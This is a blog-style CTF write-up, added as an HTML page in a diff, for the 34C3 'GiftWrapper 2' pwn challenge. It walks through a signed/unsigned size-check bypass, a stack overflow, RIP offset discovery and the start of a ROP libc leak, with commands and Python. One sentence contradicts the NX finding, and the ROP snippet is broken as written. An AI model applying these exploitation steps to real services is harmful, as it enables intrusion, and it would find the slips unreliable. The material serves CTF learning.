@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="description" content="">
+    <meta property="og:title" content="34C3 CTF: GiftWrapper 2 (pwn)">
+    
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2018-01-21">
+    
+    <meta property="og:description" content="">
+    <meta property="og:url" content="https://segflow.github.io/post/34c3-ctf-giftwrapper2/">
+    <meta property="og:site_name" content="Segflow">
+    
+    <meta property="og:tags" content="writeup">
+    
+    <meta property="og:tags" content="ctf">
+    
+    <meta property="og:tags" content="pwn">
+    
+    <meta property="og:tags" content="rop">
+    
+    <meta name="generator" content="Hugo 0.32.1" />
+    <title>34C3 CTF: GiftWrapper 2 (pwn) &middot; Segflow</title>
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css">
+    
+    <link rel="stylesheet" href="https://segflow.github.io/css/style.css">
+    
+    <link href="https://segflow.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Segflow" />
+    
+    
+    <link rel="icon" href="https://segflow.github.io/favicon.ico" />
+    
+
+    
+    
+</head>
+<body>
+
+<nav class="navbar navbar-default navbar-fixed-top visible-xs">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+				<a class="navbar-brand" href="https://segflow.github.io/">Segflow</a>
+			
+		</div>
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				
+				
+					<li><a href="https://segflow.github.io//">Home</a></li>
+				
+					<li><a href="https://segflow.github.io/post/">Posts</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</nav>
+<div class="container-fluid">
+	<div class="row">
+		<div id="menu" class="hidden-xs col-sm-3 col-md-3">
+	<div id="menu-content" class="vertical-align">
+		
+			<h1 class="text-center"><a href="https://segflow.github.io/">Segflow</a></h1>
+		
+		
+		
+			<small class="text-center center-block">Assel Meher</small>
+		
+		
+		
+			<img id="profile-pic" src="https://segflow.github.io//img/hacker_emblem.png" alt="My Picture" class="img-circle center-block">
+		
+		<div id="social" class="text-center">
+			
+				<a href="https://github.com/segflow"><i class="fa fa-github fa-2x"></i></a>
+			
+				<a href="meher-assel-0122798a"><i class="fa fa-linkedin fa-2x"></i></a>
+			
+
+			<a href="mailto:asselmeher@gmail.com"><i class="fa fa-envelope-o fa-2x"></i></a>
+		</div>
+		<div id="links" class="text-center">
+			
+			
+				<a href="https://segflow.github.io//">Home</a>
+			
+				<a href="https://segflow.github.io/post/">Posts</a>
+			
+		</div>
+	</div>
+</div>
+
+		<div id="content" class="col-xs-12 col-sm-9 col-md-9">
+			<div class="row">
+				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10">
+
+<main>
+	<header>
+		<h1>34C3 CTF: GiftWrapper 2 (pwn)</h1>
+	</header>
+
+	<article>
+		<p>In this challenge we are given a service IP and PORT, to which we can connect using <code>netcat</code> or any similar tool. We are also provided with a <code>tar</code> file that contains the service binary file and some <code>.so</code> modules.</p>
+
+<p></p>
+
+<p>The task description was the following:</p>
+
+<blockquote>
+<p>Wrapping gifts is now even more fun! Gift Wrapping Factory 2.0:</p>
+
+<p><code>nc 35.198.185.193 1341</code></p>
+
+<p><a href="../../ctf-files/34c3-ctf-2017/giftwrapper2-c653b099aa9bc1b014e5f73008a7e3552387105d.tar">Challenge files</a></p>
+</blockquote>
+
+<p>After extracting the <code>tar</code> file we get this:</p>
+
+<pre><code class="language-shell">$ ls -la
+total 3928
+drwxr-xr-x  9 segflow  staff      288 Jan 21 09:34 .
+drwxr-xr-x  8 segflow  staff      256 Jan  3 13:52 ..
+-rwxr-xr-x  1 segflow  staff     8120 Dec 27 21:22 giftwrapper2.so
+-rwxr-xr-x  1 segflow  staff  1960656 Oct 11 21:21 libc-2.26.so
+-rwxr-xr-x  1 segflow  staff    14456 Dec 27 21:22 server
+-rw-r--r--  1 segflow  staff     6024 Dec 27 19:13 server.c
+</code></pre>
+
+<p><code>server</code> is the challenge binary, <code>server.c</code> is its code. <code>libc-2.26.so</code> is the libc library used by the server.</p>
+
+<p>Before understanding the code or the purpose of <code>giftwrapper2.so</code> file, let&rsquo;s try to interact with the service to get an overall understanding what it&rsquo;s doing. Since the CTF server went down after the competition, we will run the server locally and interact with it.</p>
+
+<pre><code class="language-shell">$ nc localhost 12345
+*
+* Gift Wrapping Factory
+*
+Welcome to the new gift wrapping service!
+Type &quot;help&quot; for help :)
+&gt; help
+wrap 				(Wrap a gift)
+help 				(Show this information)
+modinfo 			(Show information about the loaded module)
+&gt; 
+</code></pre>
+
+<p>A menu is shown, and we can print the <code>help</code> message, <code>wrap</code> a gift and print some info using the <code>modinfo</code> command.</p>
+
+<pre><code class="language-shell">&gt; help
+wrap 				(Wrap a gift)
+help 				(Show this information)
+modinfo 			(Show information about the loaded module)
+&gt; modinfo
+************************************
+Information about the loaded module:
+Name: Gift Wrapping Factory
+Base address: 0x7f770a712000
+************************************
+&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; 10
+Please send me your gift.
+ |&gt; TEST GIFT
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /`   `\     |
+ |                  |
+ | TEST GIFT        |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+&gt; 
+</code></pre>
+
+<p>The <code>modinfo</code> command print some info about loaded module and it&rsquo;s base address. Probably this is about the <code>giftwrapper2.so</code> found in challenge files.</p>
+
+<p>The wrap command ask as about the size of the gift and the gift content, after that a nice ascii art is shown containing the gift message.</p>
+
+<p>Since the gift message is printed back to us, I thought it will be good to test if there is a <code>format string</code> vulnerability. Turns out there wasn&rsquo;t.</p>
+
+<pre><code class="language-shell">&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; 10
+Please send me your gift.
+ |&gt; %d
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /`   `\     |
+ |                  |
+ | %d               |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+&gt; 
+</code></pre>
+
+<p>Now let&rsquo;s see what happen if the gift message is longer then the size we typed.</p>
+
+<pre><code class="language-shell">&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; 2
+Please send me your gift.
+ |&gt; ABCDEFGHIJKLM
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /`   `\     |
+ |                  |
+ | ABC              |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; 10000
+Sorry! This gift is too large.
+&gt; 
+</code></pre>
+
+<p>Humm it gets truncated, we are also not allowed to have very big gift messages. So probably the size field is controlled (is it?).</p>
+
+<p>Now that we understand what the server is doing, let&rsquo;s check the source file.</p>
+
+<p>The server code is very straightforward,</p>
+
+<ul>
+<li>Setup a socket</li>
+<li>Load module</li>
+<li>Enter  the regular <code>accept -&gt; fork -&gt; drop_priv -&gt; interact</code> loop</li>
+</ul>
+
+<p>The <code>interact</code> function securely reads data from the user, and then calls <code>handle_input</code> which executes the corresponding command based on the user input.</p>
+
+<p><code>load_module</code> is as follow :</p>
+
+<pre><code class="language-cpp">void load_module() {
+    char* error;
+    void* handle = dlopen(LIB, RTLD_LAZY);
+    if (!handle) {
+        logf(&quot;Error on dlopen %s: %s\n&quot;, LIB, dlerror());
+        exit(EXIT_FAILURE);
+    }
+    dlerror();
+    struct link_map* lm = (struct link_map*) handle;
+    module.base = lm-&gt;l_addr;
+
+    initialize_module = dlsym(handle, &quot;initialize_module&quot;);
+    printf(&quot;%p\n&quot;, initialize_module);
+    if ((error = dlerror()) != NULL)  {
+        logf(&quot;%s\n&quot;, error);
+        exit(1);
+    }
+    initialize_module(&amp;module, register_command);
+
+    register_command(&quot;help&quot;, &quot;\t\t\t&quot;, &quot;Show this information&quot;, help);
+    register_command(&quot;modinfo&quot;, &quot;\t\t&quot;, &quot;Show information about the loaded module&quot;, module_info);
+    logf(&quot;Module successfully loaded.\n&quot;);
+}
+</code></pre>
+
+<p>Mainly it loads the <code>giftwrapper2.so</code> module, calls <code>initialize_module</code> within that module and pass the <code>register_command</code> as the second argument. After that it registers two commands <code>help</code> and <code>modinfo</code>.</p>
+
+<p>So probably the <code>wrap</code> command is registered by the module itself.</p>
+
+<p>Now it&rsquo;s time to reverse engineer the <code>giftwrapper2.so</code> module and hopefully find a flaw there. For this task, I used Binary Ninja, the symbols were not stripped so it&rsquo;s easy to spot the <code>wrap</code> function and disassemble it.</p>
+
+<p>
+<figure >
+    
+        <img src="../../img/34c3-ctf-2017/giftwrapper2-binja-wrap.png" width="100%" />
+    
+    
+</figure>
+
+<br/>
+The logic behind this function is the following:</p>
+
+<ul>
+<li>Read the size from user and store it into a buffer
+
+<ul>
+<li>If the read fails -&gt; exit</li>
+</ul></li>
+<li>Call <code>strtol</code> to convert the size into a number.
+
+<ul>
+<li>If the size is above 99 -&gt; print error message and exit the function</li>
+<li>Else, use the <code>read</code> function and pass the size to it&rsquo;s argument in order to read up to <code>size</code> bytes.</li>
+</ul></li>
+</ul>
+
+<p>Even though it sounds secure, it&rsquo;s not. The flaw is within is block, can you spot it?</p>
+
+<pre><code class="language-asm">0x855: lea rdi, rsp + 0x65
+0x85a: mov edx, 0
+0x85f: mov esi, 0
+0x864: call strtol         ; convert size to long
+0x869: mov rbp, rax
+0x86c: cmp ax, 0x63        ; compare size with 0x63 (99 in decimal)
+0x870: jg 0x94c            ; jump to 0x94c if greater
+</code></pre>
+
+<p>The conditional jump is done using the <code>jg</code> instruction which is used for <strong>signed</strong> comparison. Check this nice page to better understand <a href="http://unixwiz.net/techtips/x86-jumps.html">x86-jumps</a>. But the <code>read</code> function interpret it&rsquo;s argument as an unsigned integer, which mean if, when prompted for the size, we type <code>-1</code> (<strong>0xffffffff</strong> in hex) we can bypass the check against <strong>0x63</strong>. This is possible because <strong>0xffffffff &lt; 0x63</strong> when they are interpreted as unsigned numbers.</p>
+
+<p>Later when we reach the <code>read</code> function, <strong>0xffffffff</strong> is interpreted as an unsigned number so it&rsquo;s possible to read up to <code>4GB</code> of data.</p>
+
+<p>Using this we probably can write over the buffer boundaries and occur an overflow. To verify this hypothesis let&rsquo;s try to crash the binary.</p>
+
+<pre><code class="language-shell">$ nc 0 12345
+*
+* Gift Wrapping Factory
+*
+Welcome to the new gift wrapping service!
+Type &quot;help&quot; for help :)
+&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; -1
+Please send me your gift.
+ |&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /`   `\     |
+ |                  |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+
+$ 
+</code></pre>
+
+<p>Great instead of printing the prompt again, the connection immediately exit after printing the ascii art, this mean we probably did overwrite the return address stored in the stack.</p>
+
+<p>Using <code>rabin2</code> from the <a href="http://rada.re/r/">radare2</a> suite, we can get some info from the binary:</p>
+
+<pre><code class="language-shell">$ rabin2 -I server
+arch     x86
+binsz    12597
+bintype  elf
+bits     64
+canary   false
+class    ELF64
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+static   false
+stripped false
+subsys   linux
+va       true
+$ 
+</code></pre>
+
+<p>Great no <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack canary</a>, but the stack is not executable (<a href="https://en.wikipedia.org/wiki/NX_bit">NX Bit</a> enabled).</p>
+
+<p>The next step is to know from what offset we start controlling the instruction pointer <strong>rip</strong>, we can do this manually but trying different lengths, but we can also use <code>ragg2</code> to generate a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">Debruijn sequence</a> and calculate the exact offset after the crash.</p>
+
+<p>The size of wrap&rsquo;s stack frame is 0x70 (112 in decimal), so let&rsquo;s generate a sequence slightly greater than 112</p>
+
+<pre><code class="language-shell">$ ragg2 -r -P 140
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuA
+$ 
+</code></pre>
+
+<p>Now we can either attach the server to a debugger, configure it to follow child processes, and wait for it to crash so we can get the value of <code>rip</code> register and calculate the offset, or simple use <code>dmesg</code> command to print info about the last crashes happened in our system. Since I&rsquo;am lazy, I went for the second approach.</p>
+
+<pre><code class="language-shell">$ nc 0 12345
+*
+* Gift Wrapping Factory
+*
+Welcome to the new gift wrapping service!
+Type &quot;help&quot; for help :)
+&gt; -1
+Command not found.
+&gt; wrap
+What is the size of the gift you want to wrap?
+ |&gt; -1
+Please send me your gift.
+ |&gt; AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /`   `\     |
+ |                  |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+
+$ sudo dmesg | tail
+[ 6285.218361] clocksource: Switched to clocksource hpet
+[13404.975546] server[2981]: segfault at 41754141 ip `0000000041754141` sp 00007fff8cbed360 error 14 in libnss_files-2.25.so[7f7709ed4000+b000]
+$ 
+</code></pre>
+
+<p>Great, at the moment of crash, the instruction pointer was pointing to 0x41754141. Again using <code>ragg2</code> we can calculate the offset.</p>
+
+<pre><code class="language-shell">$ ragg2 -q 0x41754141
+Little endian: 136
+Big endian: 137
+$ 
+</code></pre>
+
+<p>From <code>rabin2</code> output, we already know that the binary&rsquo;s <a href="https://en.wikipedia.org/wiki/Endianness">endianess</a> is Little Endian, so the offset value is <strong>136</strong>.</p>
+
+<p>At this step we know that we control the instruction pointer, we also know that the stack is executable. One way to exploit this is to <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return to libc</a>, but since we don&rsquo;t know at what address <code>libc</code> is linked, we need to leak some addresses.</p>
+
+<p>Using <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> we can read from anywhere, this is done because the function <code>puts</code> actually prints bytes from the addresse pointed by <code>rdi</code> register. So by chaining
+<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address we need to read the address of any symbol from it, since we know that, for performance reason, all modules are page aligned (4kb aligned). Reading any symbol from the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> table allows us to leak addresses from <code>libc</code>, one good condidate is puts&rsquo; entry in <code>GOT</code>, to get it&rsquo;s address we can use <code>objdump -R</code>:</p>
+
+<pre><code class="language-shell">$ objdump -R server
+server:     file format elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE
+...
+0x00000000602018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
+...
+$ 
+</code></pre>
+
+<p>Now we only need a <code>pop rdi</code> gadget. By using <code>radare2</code> we can get that, below we cann that radare2 found two <code>pop rdi</code> gadgets:</p>
+
+<pre><code class="language-shell">$ radare2 server
+[0x00400dc0]&gt; /Rl pop rdi
+0x00401550: pop rdi; ret;
+0x004015c3: pop rdi; ret;
+[0x00400dc0]&gt; 
+</code></pre>
+
+<p>The following python code create the rop chain.</p>
+
+<pre><code class="language-python">
+pop_rdi   = 0x00401550
+puts_got  = 0x602018
+call_puts = 0x0040122f
+
+rop  = &quot;A&quot; * 136 # fill the buffer
+rop += pop_rdi
+rop += puts_got
+rop += call_puts
+</code></pre>
+	</article>
+</main>
+
+<div id="bottom-nav" class="text-center center-block">
+	<a href=" https://segflow.github.io/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
+</div>
+
+
+  <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "segflow-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+  </div>
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-111743535-1', 'auto');
+    ga('send', 'pageview');
+    window.baseURL = "https:\/\/segflow.github.io\/";
+  </script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.2/js/bootstrap.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js"></script>
+  
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  
+  <script src="https://segflow.github.io//js/App.js"></script>
+  
+</body>
+</html>
